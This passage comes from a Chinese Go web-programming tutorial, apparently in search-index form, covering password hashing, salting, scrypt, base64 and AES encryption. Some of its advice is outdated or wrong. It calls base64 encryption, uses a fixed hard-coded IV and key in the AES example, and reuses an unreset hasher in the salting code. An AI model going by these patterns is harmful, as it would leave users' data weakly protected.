\u56fd\u5185\u8bf8\u5982CSDN\uff0c\u8be5\u4e8b\u4ef6\u6a2a\u626b\u6574\u4e2a\u56fd\u5185\u4e92\u8054\u7f51\uff0c\u968f\u540e\u53c8\u7206\u51fa\u591a\u73a9\u6e38\u620f800\u4e07\u7528\u6237\u8d44\u6599\u88ab\u6cc4\u9732\uff0c\u53e6\u6709\u4f20\u8a00\u4eba\u4eba\u7f51\u3001\u5f00\u5fc3\u7f51\u3001\u5929\u6daf\u793e\u533a\u3001\u4e16\u7eaa\u4f73\u7f18\u3001\u767e\u5408\u7f51\u7b49\u793e\u533a\u90fd\u6709\u53ef\u80fd\u6210\u4e3a\u9ed1\u5ba2\u4e0b\u4e00\u4e2a\u76ee\u6807\u3002\u5c42\u51fa\u4e0d\u7a77\u7684\u7c7b\u4f3c\u4e8b\u4ef6\u7ed9\u7528\u6237\u7684\u7f51\u4e0a\u751f\u6d3b\u9020\u6210\u5de8\u5927\u7684\u5f71\u54cd\uff0c\u4eba\u4eba\u81ea\u5371\uff0c\u56e0\u4e3a\u4eba\u4eec\u5f80\u5f80\u4e60\u60ef\u5728\u4e0d\u540c\u7f51\u7ad9\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u7801\uff0c\u6240\u4ee5\u4e00\u5bb6\u201c\u66b4\u5e93\u201d\uff0c\u5168\u90e8\u906d\u6b83\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u4f5c\u4e3a\u4e00\u4e2aWeb\u5e94\u7528\u5f00\u53d1\u8005\uff0c\u5728\u9009\u62e9\u5bc6\u7801\u5b58\u50a8\u65b9\u6848\u65f6, \u5bb9\u6613\u6389\u5165\u54ea\u4e9b\u9677\u9631, \u4ee5\u53ca\u5982\u4f55\u907f\u514d\u8fd9\u4e9b\u9677\u9631?</p>"},{"location":"09.5/#_1","title":"\u666e\u901a\u65b9\u6848","text":"<p>\u76ee\u524d\u7528\u7684\u6700\u591a\u7684\u5bc6\u7801\u5b58\u50a8\u65b9\u6848\u662f\u5c06\u660e\u6587\u5bc6\u7801\u505a\u5355\u5411\u54c8\u5e0c\u540e\u5b58\u50a8\uff0c\u5355\u5411\u54c8\u5e0c\u7b97\u6cd5\u6709\u4e00\u4e2a\u7279\u5f81\uff1a\u65e0\u6cd5\u901a\u8fc7\u54c8\u5e0c\u540e\u7684\u6458\u8981(digest)\u6062\u590d\u539f\u59cb\u6570\u636e\uff0c\u8fd9\u4e5f\u662f\u201c\u5355\u5411\u201d\u4e8c\u5b57\u7684\u6765\u6e90\u3002\u5e38\u7528\u7684\u5355\u5411\u54c8\u5e0c\u7b97\u6cd5\u5305\u62ecSHA-256, SHA-1, MD5\u7b49\u3002</p> <p>Go\u8bed\u8a00\u5bf9\u8fd9\u4e09\u79cd\u52a0\u5bc6\u7b97\u6cd5\u7684\u5b9e\u73b0\u5982\u4e0b\u6240\u793a\uff1a <pre><code>//import \"crypto/sha256\"\nh := sha256.New()\nio.WriteString(h, \"His money is twice tainted: 'taint yours and 'taint mine.\")\nfmt.Printf(\"% x\", h.Sum(nil))\n\n//import \"crypto/sha1\"\nh := sha1.New()\nio.WriteString(h, \"His money is twice tainted: 'taint yours and 'taint mine.\")\nfmt.Printf(\"% x\", h.Sum(nil))\n\n//import \"crypto/md5\"\nh := md5.New()\nio.WriteString(h, \"\u9700\u8981\u52a0\u5bc6\u7684\u5bc6\u7801\")\nfmt.Printf(\"%x\", h.Sum(nil))\n</code></pre> \u5355\u5411\u54c8\u5e0c\u6709\u4e24\u4e2a\u7279\u6027\uff1a</p> <ul> <li>1\uff09\u540c\u4e00\u4e2a\u5bc6\u7801\u8fdb\u884c\u5355\u5411\u54c8\u5e0c\uff0c\u5f97\u5230\u7684\u603b\u662f\u552f\u4e00\u786e\u5b9a\u7684\u6458\u8981\u3002</li> <li>2\uff09\u8ba1\u7b97\u901f\u5ea6\u5feb\u3002\u968f\u7740\u6280\u672f\u8fdb\u6b65\uff0c\u4e00\u79d2\u949f\u80fd\u591f\u5b8c\u6210\u6570\u5341\u4ebf\u6b21\u5355\u5411\u54c8\u5e0c\u8ba1\u7b97\u3002</li> </ul> <p>\u7ed3\u5408\u4e0a\u9762\u4e24\u4e2a\u7279\u70b9\uff0c\u8003\u8651\u5230\u591a\u6570\u4eba\u6240\u4f7f\u7528\u7684\u5bc6\u7801\u4e3a\u5e38\u89c1\u7684\u7ec4\u5408\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6240\u6709\u5bc6\u7801\u7684\u5e38\u89c1\u7ec4\u5408\u8fdb\u884c\u5355\u5411\u54c8\u5e0c\uff0c\u5f97\u5230\u4e00\u4e2a\u6458\u8981\u7ec4\u5408, \u7136\u540e\u4e0e\u6570\u636e\u5e93\u4e2d\u7684\u6458\u8981\u8fdb\u884c\u6bd4\u5bf9\u5373\u53ef\u83b7\u5f97\u5bf9\u5e94\u7684\u5bc6\u7801\u3002\u8fd9\u4e2a\u6458\u8981\u7ec4\u5408\u4e5f\u88ab\u79f0\u4e3a<code>rainbow table</code>\u3002</p> <p>\u56e0\u6b64\u901a\u8fc7\u5355\u5411\u52a0\u5bc6\u4e4b\u540e\u5b58\u50a8\u7684\u6570\u636e\uff0c\u548c\u660e\u6587\u5b58\u50a8\u6ca1\u6709\u591a\u5927\u533a\u522b\u3002\u56e0\u6b64\uff0c\u4e00\u65e6\u7f51\u7ad9\u7684\u6570\u636e\u5e93\u6cc4\u9732\uff0c\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u672c\u8eab\u5c31\u5927\u767d\u4e8e\u5929\u4e0b\u3002</p>"},{"location":"09.5/#_2","title":"\u8fdb\u9636\u65b9\u6848","text":"<p>\u901a\u8fc7\u4e0a\u9762\u4ecb\u7ecd\u6211\u4eec\u77e5\u9053\u9ed1\u5ba2\u53ef\u4ee5\u7528<code>rainbow table</code>\u6765\u7834\u89e3\u54c8\u5e0c\u540e\u7684\u5bc6\u7801\uff0c\u5f88\u5927\u7a0b\u5ea6\u4e0a\u662f\u56e0\u4e3a\u52a0\u5bc6\u65f6\u4f7f\u7528\u7684\u54c8\u5e0c\u7b97\u6cd5\u662f\u516c\u5f00\u7684\u3002\u5982\u679c\u9ed1\u5ba2\u4e0d\u77e5\u9053\u52a0\u5bc6\u7684\u54c8\u5e0c\u7b97\u6cd5\u662f\u4ec0\u4e48\uff0c\u90a3\u4ed6\u4e5f\u5c31\u65e0\u4ece\u4e0b\u624b\u4e86\u3002</p> <p>\u4e00\u4e2a\u76f4\u63a5\u7684\u89e3\u51b3\u529e\u6cd5\u662f\uff0c\u81ea\u5df1\u8bbe\u8ba1\u4e00\u4e2a\u54c8\u5e0c\u7b97\u6cd5\u3002\u7136\u800c\uff0c\u4e00\u4e2a\u597d\u7684\u54c8\u5e0c\u7b97\u6cd5\u662f\u5f88\u96be\u8bbe\u8ba1\u7684\u2014\u2014\u65e2\u8981\u907f\u514d\u78b0\u649e\uff0c\u53c8\u4e0d\u80fd\u6709\u660e\u663e\u7684\u89c4\u5f8b\uff0c\u505a\u5230\u8fd9\u4e24\u70b9\u8981\u6bd4\u60f3\u8c61\u4e2d\u7684\u8981\u56f0\u96be\u5f88\u591a\u3002\u56e0\u6b64\u5b9e\u9645\u5e94\u7528\u4e2d\u66f4\u591a\u7684\u662f\u5229\u7528\u5df2\u6709\u7684\u54c8\u5e0c\u7b97\u6cd5\u8fdb\u884c\u591a\u6b21\u54c8\u5e0c\u3002</p> <p>\u4f46\u662f\u5355\u7eaf\u7684\u591a\u6b21\u54c8\u5e0c\uff0c\u4f9d\u7136\u963b\u6321\u4e0d\u4f4f\u9ed1\u5ba2\u3002\u4e24\u6b21 MD5\u3001\u4e09\u6b21 MD5\u4e4b\u7c7b\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u80fd\u60f3\u5230\uff0c\u9ed1\u5ba2\u81ea\u7136\u4e5f\u80fd\u60f3\u5230\u3002\u7279\u522b\u662f\u5bf9\u4e8e\u4e00\u4e9b\u5f00\u6e90\u4ee3\u7801\uff0c\u8fd9\u6837\u54c8\u5e0c\u66f4\u662f\u76f8\u5f53\u4e8e\u76f4\u63a5\u628a\u7b97\u6cd5\u544a\u8bc9\u4e86\u9ed1\u5ba2\u3002</p> <p>\u6ca1\u6709\u653b\u4e0d\u7834\u7684\u76fe\uff0c\u4f46\u4e5f\u6ca1\u6709\u6298\u4e0d\u65ad\u7684\u77db\u3002\u73b0\u5728\u5b89\u5168\u6027\u6bd4\u8f83\u597d\u7684\u7f51\u7ad9\uff0c\u90fd\u4f1a\u7528\u4e00\u79cd\u53eb\u505a\u201c\u52a0\u76d0\u201d\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u5bc6\u7801\uff0c\u4e5f\u5c31\u662f\u5e38\u8bf4\u7684 \u201csalt\u201d\u3002\u4ed6\u4eec\u901a\u5e38\u7684\u505a\u6cd5\u662f\uff0c\u5148\u5c06\u7528\u6237\u8f93\u5165\u7684\u5bc6\u7801\u8fdb\u884c\u4e00\u6b21MD5\uff08\u6216\u5176\u5b83\u54c8\u5e0c\u7b97\u6cd5\uff09\u52a0\u5bc6\uff1b\u5c06\u5f97\u5230\u7684 MD5 \u503c\u524d\u540e\u52a0\u4e0a\u4e00\u4e9b\u53ea\u6709\u7ba1\u7406\u5458\u81ea\u5df1\u77e5\u9053\u7684\u968f\u673a\u4e32\uff0c\u518d\u8fdb\u884c\u4e00\u6b21MD5\u52a0\u5bc6\u3002\u8fd9\u4e2a\u968f\u673a\u4e32\u4e2d\u53ef\u4ee5\u5305\u62ec\u67d0\u4e9b\u56fa\u5b9a\u7684\u4e32\uff0c\u4e5f\u53ef\u4ee5\u5305\u62ec\u7528\u6237\u540d\uff08\u7528\u6765\u4fdd\u8bc1\u6bcf\u4e2a\u7528\u6237\u52a0\u5bc6\u4f7f\u7528\u7684\u5bc6\u94a5\u90fd\u4e0d\u4e00\u6837\uff09\u3002</p> <p><pre><code>//import \"crypto/md5\"\n//\u5047\u8bbe\u7528\u6237\u540dabc\uff0c\u5bc6\u7801123456\nh := md5.New()\nio.WriteString(h, \"\u9700\u8981\u52a0\u5bc6\u7684\u5bc6\u7801\")\n\n//pwmd5\u7b49\u4e8ee10adc3949ba59abbe56e057f20f883e\npwmd5 :=fmt.Sprintf(\"%x\", h.Sum(nil))\n\n//\u6307\u5b9a\u4e24\u4e2a salt\uff1a salt1 = @#$%   salt2 = ^&amp;*()\nsalt1 := \"@#$%\"\nsalt2 := \"^&amp;*()\"\n\n//salt1+\u7528\u6237\u540d+salt2+MD5\u62fc\u63a5\nio.WriteString(h, salt1)\nio.WriteString(h, \"abc\")\nio.WriteString(h, salt2)\nio.WriteString(h, pwmd5)\n\nlast :=fmt.Sprintf(\"%x\", h.Sum(nil))\n</code></pre> \u5728\u4e24\u4e2asalt\u6ca1\u6709\u6cc4\u9732\u7684\u60c5\u51b5\u4e0b\uff0c\u9ed1\u5ba2\u5982\u679c\u62ff\u5230\u7684\u662f\u6700\u540e\u8fd9\u4e2a\u52a0\u5bc6\u4e32\uff0c\u5c31\u51e0\u4e4e\u4e0d\u53ef\u80fd\u63a8\u7b97\u51fa\u539f\u59cb\u7684\u5bc6\u7801\u662f\u4ec0\u4e48\u4e86\u3002</p>"},{"location":"09.5/#_3","title":"\u4e13\u5bb6\u65b9\u6848","text":"<p>\u4e0a\u9762\u7684\u8fdb\u9636\u65b9\u6848\u5728\u51e0\u5e74\u524d\u4e5f\u8bb8\u662f\u8db3\u591f\u5b89\u5168\u7684\u65b9\u6848\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u6ca1\u6709\u8db3\u591f\u7684\u8d44\u6e90\u5efa\u7acb\u8fd9\u4e48\u591a\u7684<code>rainbow table</code>\u3002 \u4f46\u662f\uff0c\u65f6\u81f3\u4eca\u65e5\uff0c\u56e0\u4e3a\u5e76\u884c\u8ba1\u7b97\u80fd\u529b\u7684\u63d0\u5347\uff0c\u8fd9\u79cd\u653b\u51fb\u5df2\u7ecf\u5b8c\u5168\u53ef\u884c\u3002</p> <p>\u600e\u4e48\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u53ea\u8981\u65f6\u95f4\u4e0e\u8d44\u6e90\u5141\u8bb8\uff0c\u6ca1\u6709\u7834\u8bd1\u4e0d\u4e86\u7684\u5bc6\u7801\uff0c\u6240\u4ee5\u65b9\u6848\u662f:\u6545\u610f\u589e\u52a0\u5bc6\u7801\u8ba1\u7b97\u6240\u9700\u8017\u8d39\u7684\u8d44\u6e90\u548c\u65f6\u95f4\uff0c\u4f7f\u5f97\u4efb\u4f55\u4eba\u90fd\u4e0d\u53ef\u83b7\u5f97\u8db3\u591f\u7684\u8d44\u6e90\u5efa\u7acb\u6240\u9700\u7684<code>rainbow table</code>\u3002</p> <p>\u8fd9\u7c7b\u65b9\u6848\u6709\u4e00\u4e2a\u7279\u70b9\uff0c\u7b97\u6cd5\u4e2d\u90fd\u6709\u4e2a\u56e0\u5b50\uff0c\u7528\u4e8e\u6307\u660e\u8ba1\u7b97\u5bc6\u7801\u6458\u8981\u6240\u9700\u8981\u7684\u8d44\u6e90\u548c\u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u8ba1\u7b97\u5f3a\u5ea6\u3002\u8ba1\u7b97\u5f3a\u5ea6\u8d8a\u5927\uff0c\u653b\u51fb\u8005\u5efa\u7acb<code>rainbow table</code>\u8d8a\u56f0\u96be\uff0c\u4ee5\u81f3\u4e8e\u4e0d\u53ef\u7ee7\u7eed\u3002</p> <p>\u8fd9\u91cc\u63a8\u8350<code>scrypt</code>\u65b9\u6848\uff0cscrypt\u662f\u7531\u8457\u540d\u7684FreeBSD\u9ed1\u5ba2Colin Percival\u4e3a\u4ed6\u7684\u5907\u4efd\u670d\u52a1Tarsnap\u5f00\u53d1\u7684\u3002</p> <p>\u76ee\u524dGo\u8bed\u8a00\u91cc\u9762\u652f\u6301\u7684\u5e93 https://github.com/golang/crypto/tree/master/scrypt <pre><code>dk := scrypt.Key([]byte(\"some password\"), []byte(salt), 16384, 8, 1, 32)\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6\u552f\u4e00\u7684\u76f8\u5e94\u7684\u5bc6\u7801\u503c\uff0c\u8fd9\u662f\u76ee\u524d\u4e3a\u6b62\u6700\u96be\u7834\u89e3\u7684\u3002</p>"},{"location":"09.5/#_4","title":"\u603b\u7ed3","text":"<p>\u770b\u5230\u8fd9\u91cc\uff0c\u5982\u679c\u4f60\u4ea7\u751f\u4e86\u5371\u673a\u611f\uff0c\u90a3\u4e48\u5c31\u884c\u52a8\u8d77\u6765\uff1a</p> <ul> <li>1\uff09\u5982\u679c\u4f60\u662f\u666e\u901a\u7528\u6237\uff0c\u90a3\u4e48\u6211\u4eec\u5efa\u8bae\u4f7f\u7528LastPass\u8fdb\u884c\u5bc6\u7801\u5b58\u50a8\u548c\u751f\u6210\uff0c\u5bf9\u4e0d\u540c\u7684\u7f51\u7ad9\u4f7f\u7528\u4e0d\u540c\u7684\u5bc6\u7801\uff1b</li> <li>2\uff09\u5982\u679c\u4f60\u662f\u5f00\u53d1\u4eba\u5458\uff0c \u90a3\u4e48\u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u4f60\u91c7\u7528\u4e13\u5bb6\u65b9\u6848\u8fdb\u884c\u5bc6\u7801\u5b58\u50a8\u3002</li> </ul>"},{"location":"09.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u786e\u4fdd\u8f93\u5165\u8fc7\u6ee4</li> <li>\u4e0b\u4e00\u8282: \u52a0\u5bc6\u548c\u89e3\u5bc6\u6570\u636e</li> </ul>"},{"location":"09.6/","title":"9.6 \u52a0\u5bc6\u548c\u89e3\u5bc6\u6570\u636e","text":"<p>\u524d\u9762\u5c0f\u8282\u4ecb\u7ecd\u4e86\u5982\u4f55\u5b58\u50a8\u5bc6\u7801\uff0c\u4f46\u662f\u6709\u7684\u65f6\u5019\uff0c\u6211\u4eec\u60f3\u628a\u4e00\u4e9b\u654f\u611f\u6570\u636e\u52a0\u5bc6\u540e\u5b58\u50a8\u8d77\u6765\uff0c\u5728\u5c06\u6765\u7684\u67d0\u4e2a\u65f6\u5019\uff0c\u968f\u9700\u5c06\u5b83\u4eec\u89e3\u5bc6\u51fa\u6765\uff0c\u6b64\u65f6\u6211\u4eec\u5e94\u8be5\u5728\u9009\u7528\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u6765\u6ee1\u8db3\u6211\u4eec\u7684\u9700\u6c42\u3002</p>"},{"location":"09.6/#base64","title":"base64\u52a0\u89e3\u5bc6","text":"<p>\u5982\u679cWeb\u5e94\u7528\u8db3\u591f\u7b80\u5355\uff0c\u6570\u636e\u7684\u5b89\u5168\u6027\u6ca1\u6709\u90a3\u4e48\u4e25\u683c\u7684\u8981\u6c42\uff0c\u90a3\u4e48\u53ef\u4ee5\u91c7\u7528\u4e00\u79cd\u6bd4\u8f83\u7b80\u5355\u7684\u52a0\u89e3\u5bc6\u65b9\u6cd5\u662f<code>base64</code>\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5b9e\u73b0\u8d77\u6765\u6bd4\u8f83\u7b80\u5355\uff0cGo\u8bed\u8a00\u7684<code>base64</code>\u5305\u5df2\u7ecf\u5f88\u597d\u7684\u652f\u6301\u4e86\u8fd9\u4e2a\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a</p> <pre><code>package main\n\nimport (\n\"encoding/base64\"\n\"fmt\"\n)\n\nfunc base64Encode(src []byte) []byte {\nreturn []byte(base64.StdEncoding.EncodeToString(src))\n}\n\nfunc base64Decode(src []byte) ([]byte, error) {\nreturn base64.StdEncoding.DecodeString(string(src))\n}\n\nfunc main() {\n// encode\nhello := \"\u4f60\u597d\uff0c\u4e16\u754c\uff01 hello world\"\ndebyte := base64Encode([]byte(hello))\nfmt.Println(debyte)\n// decode\nenbyte, err := base64Decode(debyte)\nif err != nil {\nfmt.Println(err.Error())\n}\n\nif hello != string(enbyte) {\nfmt.Println(\"hello is not equal to enbyte\")\n}\n\nfmt.Println(string(enbyte))\n}\n</code></pre>"},{"location":"09.6/#_1","title":"\u9ad8\u7ea7\u52a0\u89e3\u5bc6","text":"<p>Go\u8bed\u8a00\u7684<code>crypto</code>\u91cc\u9762\u652f\u6301\u5bf9\u79f0\u52a0\u5bc6\u7684\u9ad8\u7ea7\u52a0\u89e3\u5bc6\u5305\u6709\uff1a</p> <ul> <li><code>crypto/aes</code>\u5305\uff1aAES(Advanced Encryption Standard)\uff0c\u53c8\u79f0Rijndael\u52a0\u5bc6\u6cd5\uff0c\u662f\u7f8e\u56fd\u8054\u90a6\u653f\u5e9c\u91c7\u7528\u7684\u4e00\u79cd\u533a\u5757\u52a0\u5bc6\u6807\u51c6\u3002</li> <li><code>crypto/des</code>\u5305\uff1aDES(Data Encryption Standard)\uff0c\u662f\u4e00\u79cd\u5bf9\u79f0\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u76ee\u524d\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u5bc6\u94a5\u7cfb\u7edf\uff0c\u7279\u522b\u662f\u5728\u4fdd\u62a4\u91d1\u878d\u6570\u636e\u7684\u5b89\u5168\u4e2d\u3002\u66fe\u662f\u7f8e\u56fd\u8054\u90a6\u653f\u5e9c\u7684\u52a0\u5bc6\u6807\u51c6\uff0c\u4f46\u73b0\u5df2\u88abAES\u6240\u66ff\u4ee3\u3002</li> </ul> <p>\u56e0\u4e3a\u8fd9\u4e24\u79cd\u7b97\u6cd5\u4f7f\u7528\u65b9\u6cd5\u7c7b\u4f3c\uff0c\u6240\u4ee5\u5728\u6b64\uff0c\u6211\u4eec\u4ec5\u7528aes\u5305\u4e3a\u4f8b\u6765\u8bb2\u89e3\u5b83\u4eec\u7684\u4f7f\u7528\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50 <pre><code>package main\n\nimport (\n\"crypto/aes\"\n\"crypto/cipher\"\n\"fmt\"\n\"os\"\n)\n\nvar commonIV = []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f}\n\nfunc main() {\n//\u9700\u8981\u53bb\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\nplaintext := []byte(\"My name is Astaxie\")\n//\u5982\u679c\u4f20\u5165\u52a0\u5bc6\u4e32\u7684\u8bdd\uff0cplaint\u5c31\u662f\u4f20\u5165\u7684\u5b57\u7b26\u4e32\nif len(os.Args) &gt; 1 {\nplaintext = []byte(os.Args[1])\n}\n\n//aes\u7684\u52a0\u5bc6\u5b57\u7b26\u4e32\nkey_text := \"astaxie12798akljzmknm.ahkjkljl;k\"\nif len(os.Args) &gt; 2 {\nkey_text = os.Args[2]\n}\n\nfmt.Println(len(key_text))\n\n// \u521b\u5efa\u52a0\u5bc6\u7b97\u6cd5aes\nc, err := aes.NewCipher([]byte(key_text))\nif err != nil {\nfmt.Printf(\"Error: NewCipher(%d bytes) = %s\", len(key_text), err)\nos.Exit(-1)\n}\n\n//\u52a0\u5bc6\u5b57\u7b26\u4e32\ncfb := cipher.NewCFBEncrypter(c, commonIV)\nciphertext := make([]byte, len(plaintext))\ncfb.XORKeyStream(ciphertext, plaintext)\nfmt.Printf(\"%s=&gt;%x\\n\", plaintext, ciphertext)\n\n// \u89e3\u5bc6\u5b57\u7b26\u4e32\ncfbdec := cipher.NewCFBDecrypter(c, commonIV)\nplaintextCopy := make([]byte, len(plaintext))\ncfbdec.XORKeyStream(plaintextCopy, ciphertext)\nfmt.Printf(\"%x=&gt;%s\\n\", ciphertext, plaintextCopy)\n}\n</code></pre> \u4e0a\u9762\u901a\u8fc7\u8c03\u7528\u51fd\u6570<code>aes.NewCipher</code>(\u53c2\u6570key\u5fc5\u987b\u662f16\u300124\u6216\u800532\u4f4d\u7684[]byte\uff0c\u5206\u522b\u5bf9\u5e94AES-128, AES-192\u6216AES-256\u7b97\u6cd5),\u8fd4\u56de\u4e86\u4e00\u4e2a<code>cipher.Block</code>\u63a5\u53e3\uff0c\u8fd9\u4e2a\u63a5\u53e3\u5b9e\u73b0\u4e86\u4e09\u4e2a\u529f\u80fd\uff1a</p> <p><pre><code>type Block interface {\n// BlockSize returns the cipher's block size.\nBlockSize() int\n\n// Encrypt encrypts the first block in src into dst.\n// Dst and src may point at the same memory.\nEncrypt(dst, src []byte)\n\n// Decrypt decrypts the first block in src into dst.\n// Dst and src may point at the same memory.\nDecrypt(dst, src []byte)\n}\n</code></pre> \u8fd9\u4e09\u4e2a\u51fd\u6570\u5b9e\u73b0\u4e86\u52a0\u89e3\u5bc6\u64cd\u4f5c\uff0c\u8be6\u7ec6\u7684\u64cd\u4f5c\u8bf7\u770b\u4e0a\u9762\u7684\u4f8b\u5b50\u3002</p>"},{"location":"09.6/#_2","title":"\u603b\u7ed3","text":"<p>\u8fd9\u5c0f\u8282\u4ecb\u7ecd\u4e86\u51e0\u79cd\u52a0\u89e3\u5bc6\u7684\u7b97\u6cd5\uff0c\u5728\u5f00\u53d1Web\u5e94\u7528\u7684\u65f6\u5019\u53ef\u4ee5\u6839\u636e\u9700\u6c42\u91c7\u7528\u4e0d\u540c\u7684\u65b9\u5f0f\u8fdb\u884c\u52a0\u89e3\u5bc6\uff0c\u4e00\u822c\u7684\u5e94\u7528\u53ef\u4ee5\u91c7\u7528base64\u7b97\u6cd5\uff0c\u66f4\u52a0\u9ad8\u7ea7\u7684\u8bdd\u53ef\u4ee5\u91c7\u7528aes\u6216\u8005des\u7b97\u6cd5\u3002</p>"},{"location":"09.6/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u5b58\u50a8\u5bc6\u7801</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"09.7/","title":"9.7 \u5c0f\u7ed3","text":"<p>\u8fd9\u4e00\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\uff1aCSRF\u653b\u51fb\u3001XSS\u653b\u51fb\u3001SQL\u6ce8\u5165\u653b\u51fb\u7b49\u4e00\u4e9bWeb\u5e94\u7528\u4e2d\u5178\u578b\u7684\u653b\u51fb\u624b\u6cd5\uff0c\u5b83\u4eec\u90fd\u662f\u7531\u4e8e\u5e94\u7528\u5bf9\u7528\u6237\u7684\u8f93\u5165\u6ca1\u6709\u5f88\u597d\u7684\u8fc7\u6ee4\u5f15\u8d77\u7684\uff0c\u6240\u4ee5\u9664\u4e86\u4ecb\u7ecd\u653b\u51fb\u7684\u65b9\u6cd5\u5916\uff0c\u6211\u4eec\u4e5f\u4ecb\u7ecd\u4e86\u4e86\u5982\u4f55\u6709\u6548\u7684\u8fdb\u884c\u6570\u636e\u8fc7\u6ee4\uff0c\u4ee5\u9632\u6b62\u8fd9\u4e9b\u653b\u51fb\u7684\u53d1\u751f\u7684\u65b9\u6cd5\u3002\u7136\u540e\u9488\u5bf9\u65e5\u5f02\u4e25\u91cd\u7684\u5bc6\u7801\u6cc4\u6f0f\u4e8b\u4ef6\uff0c\u4ecb\u7ecd\u4e86\u5728\u8bbe\u8ba1Web\u5e94\u7528\u4e2d\u53ef\u91c7\u7528\u7684\u4ece\u57fa\u672c\u5230\u4e13\u5bb6\u7684\u52a0\u5bc6\u65b9\u6848\u3002\u6700\u540e\u9488\u5bf9\u654f\u611f\u6570\u636e\u7684\u52a0\u89e3\u5bc6\u7b80\u8981\u4ecb\u7ecd\u4e86\uff0cGo\u8bed\u8a00\u63d0\u4f9b\u4e09\u79cd\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\uff1abase64\u3001aes\u548cdes\u7684\u5b9e\u73b0\u3002</p> <p>\u7f16\u5199\u8fd9\u4e00\u7ae0\u7684\u76ee\u7684\u662f\u5e0c\u671b\u8bfb\u8005\u80fd\u591f\u5728\u610f\u8bc6\u91cc\u9762\u52a0\u5f3a\u5b89\u5168\u6982\u5ff5\uff0c\u5728\u7f16\u5199Web\u5e94\u7528\u7684\u65f6\u5019\u591a\u7559\u5fc3\u4e00\u70b9\uff0c\u4ee5\u4f7f\u6211\u4eec\u7f16\u5199\u7684Web\u5e94\u7528\u80fd\u8fdc\u79bb\u9ed1\u5ba2\u4eec\u7684\u653b\u51fb\u3002Go\u8bed\u8a00\u5728\u652f\u6301\u9632\u653b\u51fb\u65b9\u9762\u5df2\u7ecf\u63d0\u4f9b\u5927\u91cf\u7684\u5de5\u5177\u5305\uff0c\u6211\u4eec\u53ef\u4ee5\u5145\u5206\u7684\u5229\u7528\u8fd9\u4e9b\u5305\u6765\u505a\u51fa\u4e00\u4e2a\u5b89\u5168\u7684Web\u5e94\u7528\u3002</p>"},{"location":"09.7/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u52a0\u5bc6\u548c\u89e3\u5bc6\u6570\u636e</li> <li>\u4e0b\u4e00\u8282: \u56fd\u9645\u5316\u548c\u672c\u5730\u5316</li> </ul>"},{"location":"10.0/","title":"10 \u56fd\u9645\u5316\u548c\u672c\u5730\u5316","text":"<p>\u4e3a\u4e86\u9002\u5e94\u7ecf\u6d4e\u7684\u5168\u7403\u4e00\u4f53\u5316\uff0c\u4f5c\u4e3a\u5f00\u53d1\u8005\uff0c\u6211\u4eec\u9700\u8981\u5f00\u53d1\u51fa\u652f\u6301\u591a\u56fd\u8bed\u8a00\u3001\u56fd\u9645\u5316\u7684Web\u5e94\u7528\uff0c\u5373\u540c\u6837\u7684\u9875\u9762\u5728\u4e0d\u540c\u7684\u8bed\u8a00\u73af\u5883\u4e0b\u9700\u8981\u663e\u793a\u4e0d\u540c\u7684\u6548\u679c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5e94\u7528\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u80fd\u591f\u6839\u636e\u8bf7\u6c42\u6240\u6765\u81ea\u7684\u5730\u57df\u4e0e\u8bed\u8a00\u7684\u4e0d\u540c\u800c\u663e\u793a\u4e0d\u540c\u7684\u7528\u6237\u754c\u9762\u3002\u8fd9\u6837\uff0c\u5f53\u9700\u8981\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6dfb\u52a0\u5bf9\u65b0\u7684\u8bed\u8a00\u7684\u652f\u6301\u65f6\uff0c\u65e0\u9700\u4fee\u6539\u5e94\u7528\u7a0b\u5e8f\u7684\u4ee3\u7801\uff0c\u53ea\u9700\u8981\u589e\u52a0\u8bed\u8a00\u5305\u5373\u53ef\u5b9e\u73b0\u3002</p> <p>\u56fd\u9645\u5316\u4e0e\u672c\u5730\u5316\uff08Internationalization and localization,\u901a\u5e38\u7528i18n\u548cL10N\u8868\u793a\uff09\uff0c\u56fd\u9645\u5316\u662f\u5c06\u9488\u5bf9\u67d0\u4e2a\u5730\u533a\u8bbe\u8ba1\u7684\u7a0b\u5e8f\u8fdb\u884c\u91cd\u6784\uff0c\u4ee5\u4f7f\u5b83\u80fd\u591f\u5728\u66f4\u591a\u5730\u533a\u4f7f\u7528\uff0c\u672c\u5730\u5316\u662f\u6307\u5728\u4e00\u4e2a\u9762\u5411\u56fd\u9645\u5316\u7684\u7a0b\u5e8f\u4e2d\u589e\u52a0\u5bf9\u65b0\u5730\u533a\u7684\u652f\u6301\u3002</p> 